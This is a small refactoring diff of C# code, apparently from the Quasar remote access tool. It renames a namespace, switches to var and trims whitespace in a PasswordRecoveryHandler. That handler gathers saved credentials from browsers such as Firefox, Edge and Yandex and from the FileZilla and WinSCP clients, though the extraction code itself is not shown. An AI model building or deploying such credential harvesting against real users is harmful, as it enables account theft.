@@ -8,7 +8,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     public class PasswordRecoveryHandler : IMessageProcessor
     {
@@ -28,7 +28,7 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, GetPasswords message)
         {
-            List<RecoveredAccount> recovered = new List<RecoveredAccount>();
+            var recovered = new List<RecoveredAccount>();
 
             var passReaders = new IAccountReader[]
             {
@@ -37,10 +37,10 @@ namespace Quasar.Client.Messages
                 new OperaPassReader(),
                 new OperaGXPassReader(),
                 new EdgePassReader(),
-                new YandexPassReader(), 
-                new FirefoxPassReader(), 
-                new InternetExplorerPassReader(), 
-                new FileZillaPassReader(), 
+                new YandexPassReader(),
+                new FirefoxPassReader(),
+                new InternetExplorerPassReader(),
+                new FileZillaPassReader(),
                 new WinScpPassReader()
             };
 
